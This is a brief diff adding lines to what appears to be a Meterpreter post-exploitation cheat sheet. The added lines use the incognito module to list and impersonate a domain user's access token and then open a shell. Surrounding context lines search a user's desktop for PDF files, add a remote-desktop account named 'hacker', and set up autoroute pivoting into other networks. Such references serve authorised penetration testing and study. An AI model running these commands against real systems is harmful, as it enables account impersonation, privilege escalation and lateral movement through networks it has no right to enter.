@@ -219,6 +219,14 @@ search -d c:\\documents\ and\ settings\\<user>\\desktop\\ -f *.pdf
 
 run getgui -u hacker -p password
 
+use incognito
+help
+list_tokens -u
+impersonate_token <domain>\\<user>
+getuid
+shell
+whoami
+
 ipconfig                                      Look for dual-homed connections.
 autoroute -s <new CIDR range>                 If dual-homed.
 autoroute -p                                  Print routing table.
